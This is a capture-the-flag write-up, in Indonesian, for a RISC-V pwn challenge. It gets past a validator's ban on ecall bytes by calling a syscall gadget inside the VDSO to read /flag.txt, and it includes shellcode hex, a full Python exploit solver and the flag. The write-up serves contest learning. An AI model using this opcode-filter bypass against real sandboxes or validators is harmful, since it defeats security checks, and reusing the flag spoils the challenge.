# Golfing

**Category:** Pwn
**CTF:** LYKNCTF 2026
**Architecture:** RISC-V 64-bit
**Flag:** `LYKNCTF{"The moon is beautiful, isn't it?"::https://youtu.be/H10O2TIWbXI?si=FRemo2lpPXvkUyGh::#RISC!@2026%_^~}`

## Deskripsi

> I hope this simple enough?
>
> `nc 15.235.202.47 9002`

Service meminta sebuah ELF RISC-V dalam format Base64.

```text
Send your RISC-V ELF (base64):
```

Payload harus sangat kecil dan tidak boleh mengandung instruksi syscall secara langsung.

## Ringkasan Exploit

```text
Buat ELF RISC-V minimal
        ↓
Cari AT_SYSINFO_EHDR dari auxiliary vector
        ↓
Dapatkan base address VDSO
        ↓
Gunakan gadget ecall; ret di dalam VDSO
        ↓
openat("/flag.txt")
        ↓
read(fd, buffer, 0x100)
        ↓
write(1, buffer, bytes_read)
        ↓
Flag
```

## Recon

File challenge berisi kernel Linux RISC-V, initramfs, dan script untuk menjalankan guest melalui QEMU.

Service remote meneruskan koneksi ke program yang berjalan di guest. Program tersebut menerima ELF RISC-V Base64, melakukan beberapa validasi, lalu mengeksekusinya.

Beberapa batasan penting:

```text
Ukuran ELF harus kecil
Ukuran section .text maksimal 0x71 byte
Instruksi ecall dilarang
Instruksi ebreak dilarang
Compressed ebreak juga dilarang
```

Opcode yang ditolak:

```text
ecall   = 73 00 00 00
ebreak  = 73 00 10 00
c.ebreak = 02 90
```

Syscall Linux RISC-V normalnya membutuhkan instruksi `ecall`. Karena byte instruksinya diperiksa sebelum ELF dijalankan, syscall tidak bisa ditempatkan langsung di shellcode.

## Bypass Filter Syscall

Walaupun shellcode tidak boleh mengandung `ecall`, proses tetap memiliki VDSO yang dipetakan oleh kernel.

VDSO berisi kode executable milik kernel. Salah satu gadget yang tersedia adalah:

```asm
ecall
ret
```

Gadget berada pada offset:

```text
VDSO base + 0xc50
```

Payload hanya perlu mencari base address VDSO, lalu memanggil gadget tersebut setiap kali ingin menjalankan syscall.

Byte `ecall` tidak berada di ELF buatan kita, sehingga pemeriksaan opcode tetap lolos.

## Mencari VDSO dari Auxiliary Vector

Saat ELF mulai dieksekusi, stack berisi struktur startup Linux:

```text
argc
argv[]
NULL
envp[]
NULL
auxv[]
```

Auxiliary vector terdiri dari pasangan:

```c
typedef struct {
    uint64_t type;
    uint64_t value;
} auxv_entry;
```

Entry yang dibutuhkan adalah:

```text
AT_SYSINFO_EHDR = 33
```

Nilainya merupakan alamat base ELF VDSO.

Shellcode berjalan dari `sp`, melewati:

1. `argc`
2. Semua pointer `argv`
3. Terminator `NULL`
4. Semua pointer environment
5. Terminator `NULL`
6. Pasangan auxiliary vector

Saat type `33` ditemukan:

```text
vdso_base = auxv.value
syscall_gadget = vdso_base + 0xc50
```

Gadget tersebut dipanggil menggunakan `jalr`, sehingga register `ra` terisi alamat kembali. Instruksi `ret` setelah `ecall` akan kembali ke shellcode.

## Syscall Chain

Payload membaca `/flag.txt` menggunakan tiga syscall.

### openat

Syscall number RISC-V:

```text
openat = 56
```

Register:

```text
a0 = -100                # AT_FDCWD
a1 = address "/flag.txt"
a2 = 0                   # O_RDONLY
a3 = 0
a7 = 56
```

Pemanggilan:

```asm
jalr ra, syscall_gadget
```

Return value pada `a0` adalah file descriptor.

### read

Syscall number:

```text
read = 63
```

Register:

```text
a0 = fd
a1 = writable buffer
a2 = 0x100
a7 = 63
```

Ukuran baca awalnya sempat dibuat `0x40`, sehingga output berhenti setelah 64 byte:

```text
LYKNCTF{"The moon is beautiful, isn't it?"::https://youtu.be/H10
```

Flag ternyata lebih panjang dari 64 byte. Immediate pada instruksi `li a2, 0x40` kemudian diubah menjadi `0x100`.

Patch byte:

```text
Sebelum: 13060004
Sesudah: 13060010
```

### write

Syscall number:

```text
write = 64
```

Register:

```text
a0 = 1                   # stdout
a1 = buffer
a2 = jumlah byte hasil read
a7 = 64
```

Output dikirim langsung melalui koneksi remote.

## ELF Minimal

Payload dibungkus sebagai ELF64 little-endian untuk RISC-V.

Header utama:

```text
Class       : ELF64
Endianness  : Little endian
Machine     : EM_RISCV
Type        : ET_EXEC
Entry point : 0x100b0
```

Dua program header digunakan.

### Segment RX

```text
Virtual address : 0x10000
Permission      : Read + Execute
Content         : ELF header, program header, shellcode
```

### Segment RW

```text
Virtual address : 0x210000
Permission      : Read + Write
File size       : 0
Memory size     : 0x1000
```

Segment kedua menyediakan buffer writable tanpa perlu menyimpan data tambahan di file ELF.

Hasil akhir:

```text
.text size : 88 bytes
ELF size   : 456 bytes
Base64     : 608 bytes
```

Ukuran tersebut masih berada di bawah batas validator.

## Shellcode

Shellcode final disimpan sebagai raw machine code:

```python
TEXT = bytes.fromhex(
    "0a879307100214632107e39ef6fe0063"
    "85673e94130404c51305c0f997050000"
    "938525030146930880030294aa842685"
    "8a85130600109308f00302942a860545"
    "93080004029401459308d00502942f66"
    "6c61672e74787400"
)
```

Bagian terakhir adalah string:

```text
/flag.txt\x00
```

## Solver

```python
#!/usr/bin/env python3

import argparse
import base64
import re
import socket
import struct
import sys


TEXT = bytes.fromhex(
    "0a879307100214632107e39ef6fe0063"
    "85673e94130404c51305c0f997050000"
    "938525030146930880030294aa842685"
    "8a85130600109308f00302942a860545"
    "93080004029401459308d00502942f66"
    "6c61672e74787400"
)


def build_elf():
    ehsize = 0x40
    phentsize = 0x38
    phnum = 2

    text_offset = ehsize + phentsize * phnum
    text_address = 0x10000 + text_offset

    shentsize = 0x40
    shnum = 3
    shoff = text_offset + len(TEXT)

    total_size = shoff + shentsize * shnum
    shstr = b"\x00.text\x00.shstrtab\x00"

    elf = bytearray(total_size)

    ident = bytearray(16)
    ident[:4] = b"\x7fELF"
    ident[4] = 2
    ident[5] = 1
    ident[6] = 1

    elf[:16] = ident

    struct.pack_into(
        "<HHIQQQIHHHHHH",
        elf,
        0x10,
        2,
        0xF3,
        1,
        text_address,
        ehsize,
        shoff,
        0,
        ehsize,
        phentsize,
        phnum,
        shentsize,
        shnum,
        2,
    )

    struct.pack_into(
        "<IIQQQQQQ",
        elf,
        0x40,
        1,
        5,
        0,
        0x10000,
        0x10000,
        total_size,
        0x1000,
        0x1000,
    )

    struct.pack_into(
        "<IIQQQQQQ",
        elf,
        0x78,
        1,
        6,
        0,
        0x210000,
        0x210000,
        0,
        0x1000,
        0x1000,
    )

    elf[text_offset:text_offset + len(TEXT)] = TEXT

    shstr_offset = shoff + 0x2F
    elf[shstr_offset:shstr_offset + len(shstr)] = shstr

    struct.pack_into(
        "<IIQQQQIIQQ",
        elf,
        shoff + shentsize,
        1,
        1,
        6,
        text_address,
        text_offset,
        len(TEXT),
        0,
        0,
        2,
        0,
    )

    struct.pack_into(
        "<IIQQQQIIQQ",
        elf,
        shoff + shentsize * 2,
        7,
        3,
        0,
        0,
        shstr_offset,
        len(shstr),
        0,
        0,
        1,
        0,
    )

    return bytes(elf)


def recv_until(sock, marker):
    data = bytearray()

    while marker not in data:
        chunk = sock.recv(4096)

        if not chunk:
            break

        data.extend(chunk)

    return bytes(data)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default="15.235.202.47")
    parser.add_argument("port", nargs="?", type=int, default=9002)
    args = parser.parse_args()

    payload = base64.b64encode(build_elf())

    with socket.create_connection(
        (args.host, args.port),
        timeout=10,
    ) as sock:
        banner = recv_until(sock, b"base64): ")

        sys.stdout.write(
            banner.decode(errors="replace")
        )
        sys.stdout.flush()

        sock.sendall(payload + b"\n")

        output = bytearray()
        sock.settimeout(5)

        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break

            if not chunk:
                break

            output.extend(chunk)

    text = output.decode(errors="replace")
    print(text)

    match = re.search(
        r"LYKNCTF\{.*?\}",
        text,
        re.DOTALL,
    )

    if match:
        print(f"<FLAG>{match.group(0)}</FLAG>")


if __name__ == "__main__":
    main()
```

Jalankan:

```bash
python3 solve.py 15.235.202.47 9002
```

Output:

```text
Send your RISC-V ELF (base64):
LYKNCTF{"The moon is beautiful, isn't it?"::https://youtu.be/H10O2TIWbXI?si=FRemo2lpPXvkUyGh::#RISC!@2026%_^~}
```

## Flag

```text
LYKNCTF{"The moon is beautiful, isn't it?"::https://youtu.be/H10O2TIWbXI?si=FRemo2lpPXvkUyGh::#RISC!@2026%_^~}
```
